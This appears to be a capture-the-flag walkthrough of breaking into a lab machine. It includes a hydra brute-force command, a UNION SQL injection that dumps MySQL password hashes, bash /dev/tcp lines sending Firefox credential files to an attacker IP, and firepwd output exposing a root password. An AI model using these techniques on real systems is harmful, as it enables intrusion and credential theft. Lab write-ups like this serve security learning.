________
![[Screenshot 2025-08-03 014622.png]]

- In the initial scan we identify an open _**FTP**_ service, and the _**ftp-anon**_ nmap script confirms that the **anonymous** user is allowed.

    We try to access it and confirm that we can log in without a password, but there is nothing useful inside, so this is not a valuable vector for now.

- Next, we move to the web service on port 80. Here we notice that _**virtual hosting**_ is being used, which means we need to manually resolve domains by editing:

```
/etc/hosts
```

![[Screenshot 2025-08-03 015443.png]]  
![[Screenshot 2025-08-03 015918.png]]

- After adding the new domain and accessing it, we initially see the same content as the original page, so we need to dig deeper.

     We perform fuzzing using _**gobuster**_:

![[Screenshot 2025-08-06 014614.png]]

- While testing discovered routes, we find a reference to the name **Otis**, which becomes an important clue.

![[Captura de pantalla 2026-02-21 204054.png]]

- Since the _**SSH**_ version is lower than 7.7, we take advantage of a known user enumeration technique using an exploit.

#sshsploit

![[Screenshot 2025-08-03 023233.png]]  
![[Screenshot 2025-08-05 023959.png]]

- We download the exploit using _**searchsploit -m**_ and execute it with **python2.7**.

![[Screenshot 2025-08-06 014212.png]]

- This allows us to confirm that the user **Otis** exists in the system.

- Now that we have a valid username, we proceed with brute force using **hydra** against the SSH service:

![[Captura de pantalla 2026-02-21 231315.png]]  
    Hydra returns valid credentials.

- With these credentials, we start testing authentication across different services. In this case, we use _**SquirrelMail**_:

![[Screenshot 2025-08-05 034228.png]]

```
hydra -l otis -P /opt/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt "http-post-form://192.168.1.9/webmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
```

- An important detail here is that the credentials match the ones found for SSH, which indicates password reuse.

- We test access in different panels:
    
    - _**SquirrelMail**_ → login works, but no useful information
    - _**Monitoring panel**_ → login works
    - _**phpMyAdmin**_ → access without password (common misconfiguration with root)

- Inside the monitoring panel we find an interesting behavior:

![[Screenshot 2025-08-06 020110.png]]

- The system sends an email when a server goes down, and that email is delivered to _**SquirrelMail**_, where we already have access.

![[Screenshot 2025-08-06 022910.png]]

- By interacting with this functionality, we identify a potential attack vector.

![[Screenshot 2025-08-06 023042.png]]

- After confirming interaction and email reception, we test for _**SQL Injection**_.

#mysql

![[Screenshot 2025-08-06 023423.png]]  
![[Screenshot 2025-08-06 023456.png]]
    The application is vulnerable, so we start extracting sensitive data.

- A key detail here is understanding how _**MySQL**_ handles password storage depending on the version:

|Version|Column|Table|
|---|---|---|
|≤ 5.6|`password`|`mysql.user`|
|5.7+|`authentication_string`|`mysql.user`|
|8.0+|`authentication_string` + plugin|`mysql.user`|

- Since newer versions no longer use `password`, we include both fields in the injection:

```
test" union select 1,group_concat(user,':',password,':',authentication_string),3,4 from mysql.user-- -
```

- Extracted result:

```
elliot::5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9
```

![[Screenshot 2025-08-07 221521.png]]  
After cracking the hash, we get: **elliot123**

- We use these credentials to log in via _**SSH**_:

![[Captura de pantalla 2026-02-22 130750.png]]

- Once inside, we find interesting directories like _**.Xauthority**_ and _**.mozilla**_.

- **.Xauthority** is used for authentication in X sessions (graphical environment).
- **.mozilla** contains the Firefox user profile, which is very valuable because it may include:
    
    - `logins.json` → encrypted credentials
    - `key4.db` → encryption key
    - cookies, sessions, history, etc.

- The objective here is to decrypt those stored credentials.




- For this, we use _**firepwd**_, a tool that extracts saved Firefox passwords directly from these files.
    
    First, we download the tool from GitHub, then we transfer the required files from the victim to our attacker machine:

```
cat < key4.db > /dev/tcp/IP_ATTACKER/443
```

```
cat < logins.json > /dev/tcp/IP_ATTACKER/443
```

- This technique is known as _**data exfiltration via /dev/tcp**_. It is especially useful when tools like **nc** or **curl** are blocked, since it relies on native bash capabilities and is harder to detect.

![[Captura de pantalla 2026-02-22 165340.png]]

- This type of connection is called `/dev/tcp` data exfiltration or Bash TCP redirection for data exfiltration. It's a well-known technique in the cybersecurity world because it's common for security services like nc and curl. This method helps bypass many filters, such as firewalls, simply because it operates from local resources, making it more stealthy.

- With the files on our machine, we execute:

```
 python3 /home/altair/Desktop/insanity/firepwd/firepwd-ng.py -d .
[INFO] - Reading key4-db: verifying master_password
	[!] Master password is correct.
[INFO] - Reading key4-db: obtaining master_key
	[!] Decrypted master_key : 62aecb76297502a7455792f8a2f8c1f89b0dc89776e032b50808080808080808

[INFO] - Decrypted 1 logins

  URL: https://localhost:10000
  User: root
  Pass: S8Y389KJqWpJuSwFqFZHwfZ3GnegUa
```

- Important detail: we use the _**new generation**_ version of firepwd because this CTF handles data in 24-byte format. Older versions expect 32/48 bytes and fail.  

    The `-d` flag specifies the directory where the required files are located.
    
- With these credentials we gain access, but there is a restriction:

     Trying to log in directly as **root via SSH from outside** does not work. This is due to a security configuration where root login is restricted and only allowed from internal sessions or trusted users.


![[Screenshot 2025-08-08 000658.png]]

### Key points

#### 1
A critical step during post-exploitation is analyzing user profiles, especially browser data. Files like `logins.json` and `key4.db` can expose credentials in clear text if no master password is set, which is usually the case.